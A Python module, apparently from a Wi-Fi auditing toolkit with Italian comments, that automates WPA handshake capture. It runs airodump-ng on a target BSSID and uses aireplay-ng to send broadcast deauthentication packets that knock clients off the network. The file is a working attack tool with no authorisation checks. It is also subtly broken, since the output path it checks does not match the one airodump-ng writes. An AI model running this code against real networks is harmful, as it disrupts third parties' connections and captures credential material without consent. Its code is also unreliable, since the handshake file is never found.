"""
WiFi Capture Module: Cattura handshake con airodump-ng e aireplay-ng
"""

import logging
from typing import Dict, Any, Optional
import sys
import time
import os
import subprocess
from pathlib import Path

# Aggiungi src al path per import assoluti
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from executor.executor import CommandExecutor

logger = logging.getLogger(__name__)


class WifiCaptureModule:
    """Modulo per cattura handshake WiFi"""

    def __init__(self, executor: CommandExecutor):
        self.executor = executor
        self.airodump_tool = "airodump-ng"
        self.aireplay_tool = "aireplay-ng"

    def check_tools_available(self) -> bool:
        """Verifica se airodump-ng e aireplay-ng sono disponibili"""
        if not (self.executor.check_command_exists(self.airodump_tool) and
                self.executor.check_command_exists(self.aireplay_tool)):
            logger.error("airodump-ng o aireplay-ng non trovati. Installa con: sudo apt install aircrack-ng")
            return False
        return True

    def capture_handshake(self, interface: str, bssid: str, channel: int, duration: int = 60) -> Dict[str, Any]:
        """
        Cattura handshake per una rete WiFi specifica
        """
        if not self.check_tools_available():
            return {
                "success": False,
                "data": None,
                "error": "Strumenti aircrack-ng non disponibili"
            }

        if not self._is_monitor_mode(interface):
            return {
                "success": False,
                "data": None,
                "error": f"Interfaccia {interface} non è in modalità monitor"
            }

        # File di output
        cap_file = f"/tmp/handshake_{bssid.replace(':', '')}_{int(time.time())}.cap"

        try:
            print(f"📡 Avvio cattura su BSSID {bssid}, canale {channel}")
            print(f"⏱️  Durata: {duration} secondi")
            print("💡 Premi Ctrl+C per interrompere quando vedi 'WPA handshake'")

            # Comando airodump-ng per catturare su canale specifico
            airodump_cmd = f"{self.airodump_tool} -c {channel} --bssid {bssid} -w /tmp/handshake {interface}"
            logger.info(f"Esecuzione: {airodump_cmd}")

            # Avvia airodump-ng in background
            airodump_process = subprocess.Popen(
                airodump_cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Aspetta un po' per stabilizzare
            time.sleep(5)

            # Deauth per forzare riconnessione (se possibile)
            self._send_deauth(interface, bssid)

            # Aspetta la durata
            time.sleep(duration)

            # Termina airodump-ng
            airodump_process.terminate()
            airodump_process.wait()

            # Verifica se abbiamo catturato handshake
            if os.path.exists(cap_file):
                handshake_found = self._check_handshake(cap_file)
                return {
                    "success": True,
                    "data": {
                        "cap_file": cap_file,
                        "handshake_captured": handshake_found,
                        "bssid": bssid,
                        "channel": channel
                    },
                    "error": None
                }
            else:
                return {
                    "success": False,
                    "data": None,
                    "error": "File di cattura non creato"
                }

        except Exception as e:
            logger.error(f"Errore durante cattura: {e}")
            if os.path.exists(cap_file):
                os.remove(cap_file)
            return {
                "success": False,
                "data": None,
                "error": f"Errore cattura: {str(e)}"
            }

    def _send_deauth(self, interface: str, bssid: str):
        """Invia pacchetti deauth per forzare riconnessione"""
        try:
            # Cerca client connessi (da airodump output, ma semplificato)
            # Per semplicità, invia deauth broadcast
            aireplay_cmd = f"{self.aireplay_tool} -0 5 -a {bssid} {interface}"
            logger.info(f"Deauth: {aireplay_cmd}")

            result = subprocess.run(
                aireplay_cmd.split(),
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                print("⚡ Deauth inviato")
            else:
                print("⚠️ Deauth fallito (normale se pochi client)")
        except Exception as e:
            logger.warning(f"Deauth fallito: {e}")

    def _check_handshake(self, cap_file: str) -> bool:
        """Verifica se il file contiene un handshake WPA"""
        try:
            # Usa aircrack-ng per verificare
            check_cmd = f"aircrack-ng {cap_file} | grep -i handshake"
            result = subprocess.run(
                check_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            return "handshake" in result.stdout.lower()
        except:
            return False

    def _is_monitor_mode(self, interface: str) -> bool:
        """Verifica se l'interfaccia è in modalità monitor"""
        stdout, stderr, return_code = self.executor.execute(f"iw dev {interface} info", shell=True)
        return "monitor" in stdout.lower()